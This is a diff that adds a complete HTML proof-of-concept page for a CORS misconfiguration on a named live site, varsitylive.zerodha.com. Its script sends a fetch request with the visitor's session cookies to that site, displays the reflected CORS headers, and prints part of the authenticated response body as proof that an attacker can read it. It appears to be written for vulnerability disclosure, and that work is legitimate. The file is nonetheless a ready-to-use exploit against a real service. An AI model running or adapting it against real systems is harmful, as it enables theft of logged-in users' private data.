@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC - Zerodha Varsity Live</title>
+  <style>
+    body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
+    h2 { color: #ff4444; }
+    pre { background: #000; padding: 15px; border: 1px solid #00ff00;
+          white-space: pre-wrap; word-break: break-all; max-height: 400px; overflow-y: auto; }
+    .label { color: #ffaa00; font-weight: bold; margin-top: 12px; display: block; }
+    .good { color: #ff4444; }
+  </style>
+</head>
+<body>
+  <h2>&#128308; CORS PoC &#8212; Zerodha Varsity Live</h2>
+  <p>Attacker page origin: <strong id="origin"></strong></p>
+  <p>Target: <strong>https://varsitylive.zerodha.com</strong></p>
+  <hr>
+  <span class="label">&#9658; Access-Control-Allow-Origin reflected:</span>
+  <pre id="cors-header" class="good">Checking...</pre>
+
+  <span class="label">&#9658; Access-Control-Allow-Credentials:</span>
+  <pre id="creds-header" class="good">Checking...</pre>
+
+  <span class="label">&#9658; Response body readable cross-origin (first 500 chars):</span>
+  <pre id="body-output">Fetching with your session cookies...</pre>
+
+  <script>
+    document.getElementById('origin').textContent = window.location.origin;
+
+    fetch('https://varsitylive.zerodha.com/', {
+      method: 'GET',
+      credentials: 'include',
+      mode: 'cors'
+    })
+    .then(response => {
+      const acao = response.headers.get('access-control-allow-origin') || 'NOT SET';
+      const acac = response.headers.get('access-control-allow-credentials') || 'NOT SET';
+
+      document.getElementById('cors-header').textContent = 'Access-Control-Allow-Origin: ' + acao;
+      document.getElementById('creds-header').textContent = 'Access-Control-Allow-Credentials: ' + acac;
+
+      return response.text();
+    })
+    .then(body => {
+      document.getElementById('body-output').textContent =
+        '\u2705 CROSS-ORIGIN READ SUCCESSFUL! Attacker can read this response.\n\n' +
+        body.substring(0, 500) + '\n...(truncated)';
+    })
+    .catch(err => {
+      document.getElementById('body-output').textContent =
+        '\u274C Blocked by browser: ' + err +
+        '\n\nTip: Serve this file from localhost:\n  python3 -m http.server 8080\n  Then open http://localhost:8080/cors_poc.html';
+    });
+  </script>
+</body>
+</html>
